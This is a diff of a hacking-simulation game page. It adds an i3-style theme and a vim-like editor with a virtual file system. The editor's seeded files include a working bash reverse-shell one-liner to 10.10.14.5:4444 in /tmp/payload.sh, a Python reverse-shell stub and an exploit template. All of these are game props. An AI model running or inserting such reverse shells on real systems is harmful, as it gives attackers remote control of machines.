@@ -5,103 +5,344 @@ permalink: /game.html
 ---
 
 <style>
-/* Terminal Container */
+/* ============================================
+   i3-STYLE MINIMALIST DARK THEME
+   ============================================ */
+
+:root {
+  --bg-primary: #0d0d0d;
+  --bg-secondary: #141414;
+  --bg-tertiary: #1a1a1a;
+  --border-color: #282828;
+  --border-focused: #458588;
+  --text-primary: #ebdbb2;
+  --text-secondary: #928374;
+  --text-muted: #504945;
+  --accent-green: #98971a;
+  --accent-red: #cc241d;
+  --accent-yellow: #d79921;
+  --accent-blue: #458588;
+  --accent-purple: #b16286;
+  --accent-aqua: #689d6a;
+  --accent-orange: #d65d0e;
+  --urgent: #fb4934;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+/* Main Container - i3 tiling style */
 #game-container {
-  background: #0a0a0a;
-  border: 1px solid rgba(181, 232, 83, 0.3);
-  border-radius: 8px;
-  min-height: 70vh;
-  max-height: 80vh;
+  background: var(--bg-primary);
+  border: 2px solid var(--border-color);
+  min-height: 85vh;
+  max-height: 90vh;
   display: flex;
   flex-direction: column;
   position: relative;
   overflow: hidden;
+  font-family: 'JetBrains Mono', 'Fira Code', 'Source Code Pro', Monaco, monospace;
 }
 
-/* Terminal Header */
+/* i3 Status Bar */
+#i3-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border-color);
+  font-size: 11px;
+  height: 22px;
+}
+
+#i3-bar-left {
+  display: flex;
+  align-items: center;
+  height: 100%;
+}
+
+#i3-bar-right {
+  display: flex;
+  align-items: center;
+  height: 100%;
+  padding-right: 8px;
+  color: var(--text-secondary);
+  gap: 12px;
+}
+
+.i3-workspace {
+  padding: 0 12px;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  color: var(--text-muted);
+  cursor: pointer;
+  border-right: 1px solid var(--border-color);
+  transition: all 0.1s ease;
+}
+
+.i3-workspace:hover {
+  background: var(--bg-tertiary);
+  color: var(--text-secondary);
+}
+
+.i3-workspace.active {
+  background: var(--accent-blue);
+  color: var(--bg-primary);
+  font-weight: bold;
+}
+
+.i3-workspace.urgent {
+  background: var(--urgent);
+  color: var(--bg-primary);
+}
+
+#i3-mode {
+  padding: 0 8px;
+  color: var(--accent-yellow);
+  font-weight: bold;
+}
+
+/* Terminal Header - minimal */
 #terminal-header {
   display: flex;
   align-items: center;
+  justify-content: space-between;
+  padding: 4px 12px;
+  background: var(--bg-tertiary);
+  border-bottom: 1px solid var(--border-color);
+  font-size: 11px;
+  color: var(--text-secondary);
+}
+
+#terminal-header-left {
+  display: flex;
+  align-items: center;
   gap: 8px;
-  padding: 12px 16px;
-  background: rgba(0, 0, 0, 0.5);
-  border-bottom: 1px solid rgba(181, 232, 83, 0.2);
 }
 
-.term-dot {
-  width: 12px;
-  height: 12px;
-  border-radius: 50%;
+#terminal-header-right {
+  display: flex;
+  align-items: center;
+  gap: 12px;
 }
-
-.dot-r { background: #ff5f56; }
-.dot-y { background: #ffbd2e; }
-.dot-g { background: #27ca40; }
 
 #terminal-title {
-  font-family: Monaco, monospace;
-  font-size: 12px;
-  color: #666;
-  margin-left: auto;
+  color: var(--text-primary);
 }
 
 #sound-toggle {
-  font-family: Monaco, monospace;
-  font-size: 11px;
-  color: #555;
+  font-family: inherit;
+  font-size: 10px;
+  color: var(--text-muted);
   background: transparent;
-  border: 1px solid #333;
-  padding: 3px 8px;
-  border-radius: 3px;
+  border: 1px solid var(--border-color);
+  padding: 2px 6px;
   cursor: pointer;
-  margin-left: 10px;
 }
 
-#sound-toggle:hover {
-  border-color: #b5e853;
-  color: #b5e853;
+#sound-toggle:hover, #sound-toggle.on {
+  border-color: var(--accent-green);
+  color: var(--accent-green);
 }
 
-#sound-toggle.on {
-  border-color: #b5e853;
-  color: #b5e853;
+/* HUD - top info bar */
+#hud {
+  display: none;
+  padding: 6px 12px;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border-color);
+  font-size: 11px;
+  color: var(--text-secondary);
 }
+
+#hud span {
+  margin-right: 20px;
+}
+
+#hud .label { color: var(--text-muted); }
+#hud .value { color: var(--accent-aqua); }
 
 /* Terminal Output */
 #terminal-output {
   flex: 1;
   overflow-y: auto;
-  padding: 16px;
-  font-family: Monaco, "Courier New", monospace;
-  font-size: 13px;
-  line-height: 1.6;
-  color: #b5e853;
+  padding: 12px;
+  font-size: 12px;
+  line-height: 1.5;
+  color: var(--text-primary);
+  background: var(--bg-primary);
 }
 
 #terminal-output::-webkit-scrollbar {
-  width: 6px;
+  width: 4px;
 }
 
 #terminal-output::-webkit-scrollbar-track {
-  background: #111;
+  background: var(--bg-primary);
 }
 
 #terminal-output::-webkit-scrollbar-thumb {
-  background: #333;
-  border-radius: 3px;
+  background: var(--border-color);
 }
 
 .output-line {
   white-space: pre-wrap;
   word-wrap: break-word;
+  margin: 0;
+  padding: 0;
 }
 
-.output-line.error { color: #ff5f56; }
-.output-line.success { color: #27ca40; }
-.output-line.info { color: #63c0f5; }
-.output-line.warning { color: #ffbd2e; }
-.output-line.system { color: #888; }
-.output-line.ascii { color: #b5e853; text-shadow: 0 0 5px rgba(181, 232, 83, 0.5); }
+.output-line.error { color: var(--accent-red); }
+.output-line.success { color: var(--accent-green); }
+.output-line.info { color: var(--accent-blue); }
+.output-line.warning { color: var(--accent-yellow); }
+.output-line.system { color: var(--text-secondary); }
+.output-line.ascii { color: var(--accent-green); font-weight: bold; }
+.output-line.highlight { color: var(--text-primary); font-weight: bold; }
+.output-line.muted { color: var(--text-muted); }
+.output-line.purple { color: var(--accent-purple); }
+.output-line.orange { color: var(--accent-orange); }
+.output-line.aqua { color: var(--accent-aqua); }
+
+/* Code blocks in output */
+.code-block {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border-color);
+  border-left: 3px solid var(--accent-blue);
+  padding: 8px 12px;
+  margin: 8px 0;
+  font-size: 11px;
+  overflow-x: auto;
+}
+
+/* Network map display */
+.network-map {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border-color);
+  padding: 12px;
+  margin: 8px 0;
+  font-size: 10px;
+  line-height: 1.3;
+}
+
+/* ============================================
+   CODE EDITOR MODAL (vim-like)
+   ============================================ */
+#code-editor-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.9);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+}
+
+#code-editor-container {
+  width: 90%;
+  max-width: 900px;
+  height: 80%;
+  background: var(--bg-primary);
+  border: 2px solid var(--border-focused);
+  display: flex;
+  flex-direction: column;
+}
+
+#code-editor-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 4px 12px;
+  background: var(--bg-tertiary);
+  border-bottom: 1px solid var(--border-color);
+  font-size: 11px;
+}
+
+#code-editor-filename {
+  color: var(--text-primary);
+}
+
+#code-editor-mode {
+  color: var(--accent-yellow);
+  font-weight: bold;
+}
+
+#code-editor-status {
+  color: var(--text-secondary);
+}
+
+#code-editor-body {
+  flex: 1;
+  display: flex;
+  overflow: hidden;
+}
+
+#code-editor-lines {
+  width: 40px;
+  background: var(--bg-secondary);
+  border-right: 1px solid var(--border-color);
+  padding: 8px 4px;
+  text-align: right;
+  font-size: 11px;
+  color: var(--text-muted);
+  overflow: hidden;
+  line-height: 1.5;
+}
+
+#code-editor-content {
+  flex: 1;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  font-family: inherit;
+  font-size: 12px;
+  line-height: 1.5;
+  padding: 8px;
+  border: none;
+  outline: none;
+  resize: none;
+  overflow: auto;
+  white-space: pre;
+  tab-size: 4;
+}
+
+#code-editor-footer {
+  padding: 4px 12px;
+  background: var(--bg-secondary);
+  border-top: 1px solid var(--border-color);
+  font-size: 10px;
+  color: var(--text-muted);
+}
+
+#code-editor-command {
+  display: none;
+  background: var(--bg-tertiary);
+  padding: 4px 12px;
+  border-top: 1px solid var(--border-color);
+}
+
+#code-editor-command input {
+  background: transparent;
+  border: none;
+  outline: none;
+  color: var(--text-primary);
+  font-family: inherit;
+  font-size: 12px;
+  width: 100%;
+}
+
+/* Syntax highlighting classes */
+.syntax-keyword { color: var(--accent-red); }
+.syntax-string { color: var(--accent-green); }
+.syntax-number { color: var(--accent-purple); }
+.syntax-comment { color: var(--text-muted); font-style: italic; }
+.syntax-function { color: var(--accent-yellow); }
+.syntax-type { color: var(--accent-blue); }
 .output-line.highlight { color: #fff; text-shadow: 0 0 10px rgba(255, 255, 255, 0.5); }
 
 /* Terminal Input */
@@ -295,29 +536,75 @@ permalink: /game.html
 }
 </style>
 
-<div id="game-container">
-  <div class="scanline"></div>
+<!-- Code Editor Modal -->
+<div id="code-editor-overlay">
+  <div id="code-editor-container">
+    <div id="code-editor-header">
+      <span id="code-editor-filename">exploit.c</span>
+      <span id="code-editor-mode">-- NORMAL --</span>
+      <span id="code-editor-status">Ln 1, Col 1</span>
+    </div>
+    <div id="code-editor-body">
+      <div id="code-editor-lines"></div>
+      <textarea id="code-editor-content" spellcheck="false"></textarea>
+    </div>
+    <div id="code-editor-footer">
+      :w to save | :q to quit | :wq to save and quit | i for insert mode | ESC for normal mode
+    </div>
+    <div id="code-editor-command">
+      <input type="text" id="code-editor-cmd-input" placeholder="">
+    </div>
+  </div>
+</div>
 
-  <div id="terminal-header">
-    <span class="term-dot dot-r"></span>
-    <span class="term-dot dot-y"></span>
-    <span class="term-dot dot-g"></span>
-    <span id="terminal-title">root@localhost</span>
-    <button id="sound-toggle">sound: off</button>
+<div id="game-container">
+  <!-- i3 Status Bar -->
+  <div id="i3-bar">
+    <div id="i3-bar-left">
+      <div class="i3-workspace active" data-ws="1">1:term</div>
+      <div class="i3-workspace" data-ws="2">2:web</div>
+      <div class="i3-workspace" data-ws="3">3:code</div>
+      <div class="i3-workspace" data-ws="4">4:mon</div>
+      <span id="i3-mode"></span>
+    </div>
+    <div id="i3-bar-right">
+      <span id="i3-network">eth0: 10.10.14.5</span>
+      <span id="i3-cpu">cpu: 12%</span>
+      <span id="i3-mem">mem: 2.1G</span>
+      <span id="i3-time"></span>
+    </div>
   </div>
 
+  <!-- Terminal Header -->
+  <div id="terminal-header">
+    <div id="terminal-header-left">
+      <span id="terminal-title">root@kali</span>
+      <span id="terminal-path">~</span>
+    </div>
+    <div id="terminal-header-right">
+      <span id="terminal-pts">pts/0</span>
+      <button id="sound-toggle">🔇</button>
+    </div>
+  </div>
+
+  <!-- HUD for level info -->
   <div id="hud">
     <span><span class="label">LEVEL:</span> <span class="value" id="hud-level">-</span></span>
     <span><span class="label">TARGET:</span> <span class="value" id="hud-target">-</span></span>
     <span><span class="label">OBJECTIVE:</span> <span class="value" id="hud-objective">-</span></span>
+    <span><span class="label">PROGRESS:</span> <span class="value" id="hud-progress">0%</span></span>
   </div>
 
+  <!-- Level select screen -->
   <div id="level-select"></div>
 
+  <!-- Main terminal output -->
   <div id="terminal-output"></div>
 
+  <!-- Autocomplete dropdown -->
   <div id="autocomplete"></div>
 
+  <!-- Input line -->
   <div id="terminal-input-line">
     <span id="prompt">$</span>
     <input type="text" id="terminal-input" autofocus autocomplete="off" spellcheck="false">
@@ -373,6 +660,1558 @@ function playBoot() {
 }
 
 // ============================================
+// i3 BAR SYSTEM
+// ============================================
+function updateI3Bar() {
+  const now = new Date();
+  const timeStr = now.toLocaleTimeString('en-US', { hour12: false });
+  const dateStr = now.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
+  document.getElementById('i3-time').textContent = `${dateStr} ${timeStr}`;
+
+  // Random CPU/MEM updates for realism
+  if (Math.random() < 0.1) {
+    const cpu = Math.floor(Math.random() * 30) + 5;
+    const mem = (Math.random() * 2 + 1.5).toFixed(1);
+    document.getElementById('i3-cpu').textContent = `cpu: ${cpu}%`;
+    document.getElementById('i3-mem').textContent = `mem: ${mem}G`;
+  }
+}
+
+// Update i3 bar every second
+setInterval(updateI3Bar, 1000);
+updateI3Bar();
+
+function setI3Mode(mode) {
+  document.getElementById('i3-mode').textContent = mode ? `[${mode}]` : '';
+}
+
+function setActiveWorkspace(ws) {
+  document.querySelectorAll('.i3-workspace').forEach(el => {
+    el.classList.toggle('active', el.dataset.ws === String(ws));
+  });
+}
+
+// ============================================
+// CODE EDITOR SYSTEM (vim-like)
+// ============================================
+const codeEditor = {
+  isOpen: false,
+  mode: 'normal', // normal, insert, command, visual, search
+  filename: 'exploit.c',
+  content: '',
+  savedContent: '',
+  onSave: null,
+  cursorLine: 1,
+  cursorCol: 1,
+  // Vim registers and state
+  yankBuffer: '',
+  undoStack: [],
+  redoStack: [],
+  searchQuery: '',
+  searchResults: [],
+  searchIndex: 0,
+  visualStart: null,
+  visualEnd: null,
+  lastCommand: '',
+  repeatCount: 0,
+  pendingKey: '', // For multi-key commands like gg, dd
+};
+
+function openCodeEditor(filename, content, onSave) {
+  codeEditor.filename = filename;
+  codeEditor.content = content;
+  codeEditor.savedContent = content;
+  codeEditor.onSave = onSave;
+  codeEditor.mode = 'normal';
+  codeEditor.isOpen = true;
+
+  document.getElementById('code-editor-overlay').style.display = 'flex';
+  document.getElementById('code-editor-filename').textContent = filename;
+  document.getElementById('code-editor-content').value = content;
+  document.getElementById('code-editor-mode').textContent = '-- NORMAL --';
+
+  updateEditorLineNumbers();
+  setActiveWorkspace(3); // Switch to code workspace
+
+  // Focus but don't enable typing in normal mode
+  document.getElementById('code-editor-content').focus();
+  document.getElementById('code-editor-content').readOnly = true;
+}
+
+function closeCodeEditor(save = false) {
+  if (save && codeEditor.onSave) {
+    codeEditor.onSave(document.getElementById('code-editor-content').value);
+  }
+
+  codeEditor.isOpen = false;
+  document.getElementById('code-editor-overlay').style.display = 'none';
+  setActiveWorkspace(1); // Back to terminal
+  document.getElementById('terminal-input').focus();
+}
+
+function updateEditorLineNumbers() {
+  const content = document.getElementById('code-editor-content').value;
+  const lines = content.split('\n').length;
+  let lineNums = '';
+  for (let i = 1; i <= Math.max(lines, 20); i++) {
+    lineNums += i + '\n';
+  }
+  document.getElementById('code-editor-lines').textContent = lineNums;
+}
+
+function setEditorMode(mode) {
+  codeEditor.mode = mode;
+  const textarea = document.getElementById('code-editor-content');
+  const modeDisplay = document.getElementById('code-editor-mode');
+  const cmdLine = document.getElementById('code-editor-command');
+
+  switch (mode) {
+    case 'normal':
+      modeDisplay.textContent = '-- NORMAL --';
+      textarea.readOnly = true;
+      cmdLine.style.display = 'none';
+      textarea.focus();
+      break;
+    case 'insert':
+      modeDisplay.textContent = '-- INSERT --';
+      textarea.readOnly = false;
+      cmdLine.style.display = 'none';
+      textarea.focus();
+      break;
+    case 'visual':
+      modeDisplay.textContent = '-- VISUAL --';
+      textarea.readOnly = true;
+      cmdLine.style.display = 'none';
+      codeEditor.visualStart = textarea.selectionStart;
+      break;
+    case 'visualLine':
+      modeDisplay.textContent = '-- VISUAL LINE --';
+      textarea.readOnly = true;
+      cmdLine.style.display = 'none';
+      codeEditor.visualStart = textarea.selectionStart;
+      break;
+    case 'command':
+      modeDisplay.textContent = '';
+      cmdLine.style.display = 'block';
+      document.getElementById('code-editor-cmd-input').value = ':';
+      document.getElementById('code-editor-cmd-input').focus();
+      break;
+    case 'search':
+      modeDisplay.textContent = '';
+      cmdLine.style.display = 'block';
+      document.getElementById('code-editor-cmd-input').value = '/';
+      document.getElementById('code-editor-cmd-input').focus();
+      break;
+    case 'replace':
+      modeDisplay.textContent = '-- REPLACE --';
+      textarea.readOnly = false;
+      cmdLine.style.display = 'none';
+      break;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIRTUAL FILE SYSTEM for Code Editor
+// ═══════════════════════════════════════════════════════════════
+const editorFileSystem = {
+  files: {},
+  currentDir: '/home/user',
+
+  // Initialize with some default files
+  init() {
+    this.files = {
+      '/home/user/exploit.c': `#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// Kernel exploit template
+// Target: CVE-XXXX-XXXX
+
+int main(int argc, char *argv[]) {
+    printf("[*] Exploit starting...\\n");
+
+    // TODO: Add exploit code here
+
+    return 0;
+}`,
+      '/home/user/shell.py': `#!/usr/bin/env python3
+import socket
+import subprocess
+import os
+
+# Reverse shell template
+RHOST = "10.10.14.5"
+RPORT = 4444
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((RHOST, RPORT))
+    # TODO: Implement shell
+
+if __name__ == "__main__":
+    connect()`,
+      '/home/user/notes.txt': `=== Penetration Test Notes ===
+
+Target: 10.10.10.15
+Date: 2024-XX-XX
+
+Enumeration:
+- [ ] Port scan
+- [ ] Service enumeration
+- [ ] Web directory fuzzing
+
+Findings:
+- TBD
+
+Credentials Found:
+- TBD
+`,
+      '/home/user/.bashrc': `# .bashrc
+export PS1='\\u@\\h:\\w\\$ '
+alias ll='ls -la'
+alias grep='grep --color=auto'
+`,
+      '/tmp/payload.sh': `#!/bin/bash
+# Payload script
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+`
+    };
+
+    // Load from localStorage if exists
+    const saved = localStorage.getItem('editorFileSystem');
+    if (saved) {
+      try {
+        const parsed = JSON.parse(saved);
+        this.files = { ...this.files, ...parsed };
+      } catch (e) {
+        console.error('Failed to load editor filesystem:', e);
+      }
+    }
+  },
+
+  save() {
+    localStorage.setItem('editorFileSystem', JSON.stringify(this.files));
+  },
+
+  readFile(path) {
+    const fullPath = this.resolvePath(path);
+    return this.files[fullPath] || null;
+  },
+
+  writeFile(path, content) {
+    const fullPath = this.resolvePath(path);
+    this.files[fullPath] = content;
+    this.save();
+    return true;
+  },
+
+  deleteFile(path) {
+    const fullPath = this.resolvePath(path);
+    if (this.files[fullPath]) {
+      delete this.files[fullPath];
+      this.save();
+      return true;
+    }
+    return false;
+  },
+
+  listFiles(dir) {
+    const fullDir = this.resolvePath(dir || this.currentDir);
+    const files = [];
+    for (const path of Object.keys(this.files)) {
+      if (path.startsWith(fullDir + '/')) {
+        const relative = path.slice(fullDir.length + 1);
+        if (!relative.includes('/')) {
+          files.push(relative);
+        }
+      }
+    }
+    return files;
+  },
+
+  resolvePath(path) {
+    if (path.startsWith('/')) return path;
+    if (path.startsWith('~/')) return '/home/user' + path.slice(1);
+    return this.currentDir + '/' + path;
+  },
+
+  exists(path) {
+    return this.files[this.resolvePath(path)] !== undefined;
+  }
+};
+
+// Initialize filesystem on load
+document.addEventListener('DOMContentLoaded', () => {
+  editorFileSystem.init();
+});
+
+function handleEditorCommand(cmd) {
+  cmd = cmd.trim();
+
+  // :w - write current file
+  if (cmd === ':w') {
+    const content = document.getElementById('code-editor-content').value;
+    editorFileSystem.writeFile(codeEditor.filename, content);
+    if (codeEditor.onSave) {
+      codeEditor.onSave(content);
+    }
+    codeEditor.savedContent = content;
+    setEditorMode('normal');
+    print(`"${codeEditor.filename}" written`, 'system');
+    return;
+  }
+
+  // :w <filename> - write to specific file
+  if (cmd.startsWith(':w ')) {
+    const filename = cmd.slice(3).trim();
+    const content = document.getElementById('code-editor-content').value;
+    editorFileSystem.writeFile(filename, content);
+    codeEditor.filename = filename;
+    codeEditor.savedContent = content;
+    document.getElementById('code-editor-filename').textContent = filename;
+    setEditorMode('normal');
+    print(`"${filename}" written`, 'system');
+    return;
+  }
+
+  // :e <filename> - edit/open file
+  if (cmd.startsWith(':e ')) {
+    const filename = cmd.slice(3).trim();
+    const content = editorFileSystem.readFile(filename);
+    if (content !== null) {
+      codeEditor.filename = filename;
+      codeEditor.content = content;
+      codeEditor.savedContent = content;
+      document.getElementById('code-editor-filename').textContent = filename;
+      document.getElementById('code-editor-content').value = content;
+      updateEditorLineNumbers();
+      setEditorCursorPos(1, 1);
+    } else {
+      // New file
+      codeEditor.filename = filename;
+      codeEditor.content = '';
+      codeEditor.savedContent = '';
+      document.getElementById('code-editor-filename').textContent = filename + ' [New]';
+      document.getElementById('code-editor-content').value = '';
+      updateEditorLineNumbers();
+    }
+    setEditorMode('normal');
+    return;
+  }
+
+  // :ls or :files - list files
+  if (cmd === ':ls' || cmd === ':files') {
+    const files = Object.keys(editorFileSystem.files);
+    print('Files in editor filesystem:', 'info');
+    files.forEach(f => print('  ' + f, 'system'));
+    setEditorMode('normal');
+    return;
+  }
+
+  // :q - quit
+  if (cmd === ':q') {
+    if (document.getElementById('code-editor-content').value !== codeEditor.savedContent) {
+      print('E37: No write since last change (add ! to override)', 'error');
+      setEditorMode('normal');
+      return;
+    }
+    closeCodeEditor(false);
+    return;
+  }
+
+  // :wq or :x - write and quit
+  if (cmd === ':wq' || cmd === ':x') {
+    const content = document.getElementById('code-editor-content').value;
+    editorFileSystem.writeFile(codeEditor.filename, content);
+    if (codeEditor.onSave) {
+      codeEditor.onSave(content);
+    }
+    closeCodeEditor(true);
+    return;
+  }
+
+  // :q! - force quit
+  if (cmd === ':q!') {
+    document.getElementById('code-editor-content').value = codeEditor.savedContent;
+    closeCodeEditor(false);
+    return;
+  }
+
+  // :<number> - go to line
+  const lineMatch = cmd.match(/^:(\d+)$/);
+  if (lineMatch) {
+    const lineNum = parseInt(lineMatch[1]);
+    setEditorCursorPos(lineNum, 1);
+    setEditorMode('normal');
+    return;
+  }
+
+  // :%s/pattern/replacement/flags - substitute
+  const subMatch = cmd.match(/^:%s\/(.+?)\/(.*)\/([gi]*)$/);
+  if (subMatch) {
+    saveUndoState();
+    const [, pattern, replacement, flags] = subMatch;
+    const textarea = document.getElementById('code-editor-content');
+    try {
+      const regex = new RegExp(pattern, flags || 'g');
+      const matches = textarea.value.match(regex);
+      const count = matches ? matches.length : 0;
+      textarea.value = textarea.value.replace(regex, replacement);
+      updateEditorLineNumbers();
+      print(`${count} substitution(s)`, 'info');
+    } catch (e) {
+      print(`E486: Pattern not found: ${pattern}`, 'error');
+    }
+    setEditorMode('normal');
+    return;
+  }
+
+  // :set <option> - set options
+  if (cmd.startsWith(':set ')) {
+    const option = cmd.slice(5).trim();
+    if (option === 'number' || option === 'nu') {
+      document.getElementById('code-editor-lines').style.display = 'block';
+      print('Line numbers enabled', 'info');
+    } else if (option === 'nonumber' || option === 'nonu') {
+      document.getElementById('code-editor-lines').style.display = 'none';
+      print('Line numbers disabled', 'info');
+    } else if (option === 'syntax on') {
+      print('Syntax highlighting enabled', 'info');
+    } else if (option === 'syntax off') {
+      print('Syntax highlighting disabled', 'info');
+    }
+    setEditorMode('normal');
+    return;
+  }
+
+  // :help - show help
+  if (cmd === ':help' || cmd === ':h') {
+    print('╔═══════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                       VIM EDITOR HELP                             ║', 'info');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║ MODES:                                                            ║', 'system');
+    print('║   i     - Insert mode     a     - Append mode                     ║', 'system');
+    print('║   v     - Visual mode     V     - Visual line mode                ║', 'system');
+    print('║   :     - Command mode    /     - Search mode                     ║', 'system');
+    print('║   Esc   - Normal mode     R     - Replace mode                    ║', 'system');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║ MOVEMENT:                                                         ║', 'system');
+    print('║   h/j/k/l - Left/Down/Up/Right    w/b - Word forward/back         ║', 'system');
+    print('║   0/$     - Line start/end        ^   - First non-whitespace      ║', 'system');
+    print('║   gg/G    - File start/end        :n  - Go to line n              ║', 'system');
+    print('║   f<c>    - Find char forward     F<c>- Find char backward        ║', 'system');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║ EDITING:                                                          ║', 'system');
+    print('║   x       - Delete char           dd  - Delete line               ║', 'system');
+    print('║   yy      - Yank line             p/P - Paste after/before        ║', 'system');
+    print('║   u       - Undo                  Ctrl+r - Redo                   ║', 'system');
+    print('║   o/O     - New line below/above  J   - Join lines                ║', 'system');
+    print('║   ciw     - Change inner word     diw - Delete inner word         ║', 'system');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║ COMMANDS:                                                         ║', 'system');
+    print('║   :w      - Save file             :q  - Quit                      ║', 'system');
+    print('║   :wq     - Save and quit         :q! - Force quit                ║', 'system');
+    print('║   :e file - Open file             :ls - List files                ║', 'system');
+    print('║   :%s/p/r/g - Substitute          :n  - Go to line n              ║', 'system');
+    print('╚═══════════════════════════════════════════════════════════════════╝', 'info');
+    setEditorMode('normal');
+    return;
+  }
+
+  // :new - new buffer
+  if (cmd === ':new') {
+    codeEditor.filename = 'untitled';
+    codeEditor.content = '';
+    codeEditor.savedContent = '';
+    document.getElementById('code-editor-filename').textContent = 'untitled [New]';
+    document.getElementById('code-editor-content').value = '';
+    updateEditorLineNumbers();
+    setEditorMode('normal');
+    return;
+  }
+
+  // Unknown command
+  setEditorMode('normal');
+  if (cmd.length > 1) {
+    print(`E492: Not an editor command: ${cmd.slice(1)}`, 'error');
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIM EDITOR - Helper functions
+// ═══════════════════════════════════════════════════════════════
+function getEditorCursorPos() {
+  const textarea = document.getElementById('code-editor-content');
+  const pos = textarea.selectionStart;
+  const lines = textarea.value.substr(0, pos).split('\n');
+  return {
+    line: lines.length,
+    col: lines[lines.length - 1].length + 1,
+    pos: pos
+  };
+}
+
+function setEditorCursorPos(line, col) {
+  const textarea = document.getElementById('code-editor-content');
+  const lines = textarea.value.split('\n');
+
+  // Clamp line
+  line = Math.max(1, Math.min(line, lines.length));
+  // Clamp col
+  const lineContent = lines[line - 1] || '';
+  col = Math.max(1, Math.min(col, lineContent.length + 1));
+
+  // Calculate position
+  let pos = 0;
+  for (let i = 0; i < line - 1; i++) {
+    pos += lines[i].length + 1; // +1 for newline
+  }
+  pos += col - 1;
+
+  textarea.selectionStart = textarea.selectionEnd = pos;
+  textarea.focus();
+
+  codeEditor.cursorLine = line;
+  codeEditor.cursorCol = col;
+  updateEditorStatus();
+}
+
+function updateEditorStatus() {
+  const pos = getEditorCursorPos();
+  document.getElementById('code-editor-status').textContent = `Ln ${pos.line}, Col ${pos.col}`;
+}
+
+function getLineContent(lineNum) {
+  const textarea = document.getElementById('code-editor-content');
+  const lines = textarea.value.split('\n');
+  return lines[lineNum - 1] || '';
+}
+
+function getLineCount() {
+  const textarea = document.getElementById('code-editor-content');
+  return textarea.value.split('\n').length;
+}
+
+function saveUndoState() {
+  const textarea = document.getElementById('code-editor-content');
+  codeEditor.undoStack.push({
+    content: textarea.value,
+    cursor: textarea.selectionStart
+  });
+  // Limit undo stack
+  if (codeEditor.undoStack.length > 100) {
+    codeEditor.undoStack.shift();
+  }
+  codeEditor.redoStack = [];
+}
+
+function editorUndo() {
+  if (codeEditor.undoStack.length === 0) return;
+  const textarea = document.getElementById('code-editor-content');
+  const current = { content: textarea.value, cursor: textarea.selectionStart };
+  codeEditor.redoStack.push(current);
+
+  const state = codeEditor.undoStack.pop();
+  textarea.value = state.content;
+  textarea.selectionStart = textarea.selectionEnd = state.cursor;
+  updateEditorLineNumbers();
+  updateEditorStatus();
+}
+
+function editorRedo() {
+  if (codeEditor.redoStack.length === 0) return;
+  const textarea = document.getElementById('code-editor-content');
+  const current = { content: textarea.value, cursor: textarea.selectionStart };
+  codeEditor.undoStack.push(current);
+
+  const state = codeEditor.redoStack.pop();
+  textarea.value = state.content;
+  textarea.selectionStart = textarea.selectionEnd = state.cursor;
+  updateEditorLineNumbers();
+  updateEditorStatus();
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIM EDITOR - Navigation commands
+// ═══════════════════════════════════════════════════════════════
+function vimMove(direction, count = 1) {
+  const textarea = document.getElementById('code-editor-content');
+  const pos = getEditorCursorPos();
+  const lines = textarea.value.split('\n');
+
+  for (let i = 0; i < count; i++) {
+    switch (direction) {
+      case 'h': // left
+        if (pos.col > 1) pos.col--;
+        break;
+      case 'l': // right
+        if (pos.col <= lines[pos.line - 1].length) pos.col++;
+        break;
+      case 'j': // down
+        if (pos.line < lines.length) {
+          pos.line++;
+          pos.col = Math.min(pos.col, lines[pos.line - 1].length + 1);
+        }
+        break;
+      case 'k': // up
+        if (pos.line > 1) {
+          pos.line--;
+          pos.col = Math.min(pos.col, lines[pos.line - 1].length + 1);
+        }
+        break;
+      case 'w': // word forward
+        const lineW = lines[pos.line - 1];
+        const afterW = lineW.slice(pos.col - 1);
+        const matchW = afterW.match(/^\w*\s*\w?/);
+        if (matchW && matchW[0].length > 1) {
+          pos.col += matchW[0].length - 1;
+        } else if (pos.line < lines.length) {
+          pos.line++;
+          pos.col = 1;
+        }
+        break;
+      case 'b': // word backward
+        const lineB = lines[pos.line - 1];
+        const beforeB = lineB.slice(0, pos.col - 1);
+        const matchB = beforeB.match(/\w+\s*$/);
+        if (matchB) {
+          pos.col -= matchB[0].length;
+        } else if (pos.line > 1) {
+          pos.line--;
+          pos.col = lines[pos.line - 1].length + 1;
+        }
+        break;
+      case '0': // start of line
+        pos.col = 1;
+        break;
+      case '$': // end of line
+        pos.col = lines[pos.line - 1].length + 1;
+        break;
+      case '^': // first non-whitespace
+        const lineStart = lines[pos.line - 1];
+        const firstChar = lineStart.search(/\S/);
+        pos.col = firstChar >= 0 ? firstChar + 1 : 1;
+        break;
+      case 'G': // go to end
+        pos.line = lines.length;
+        pos.col = 1;
+        break;
+      case 'gg': // go to start
+        pos.line = 1;
+        pos.col = 1;
+        break;
+    }
+  }
+
+  setEditorCursorPos(pos.line, pos.col);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIM EDITOR - Editing commands
+// ═══════════════════════════════════════════════════════════════
+function vimDeleteLine(count = 1) {
+  saveUndoState();
+  const textarea = document.getElementById('code-editor-content');
+  const pos = getEditorCursorPos();
+  const lines = textarea.value.split('\n');
+
+  const deleted = lines.splice(pos.line - 1, count);
+  codeEditor.yankBuffer = deleted.join('\n');
+
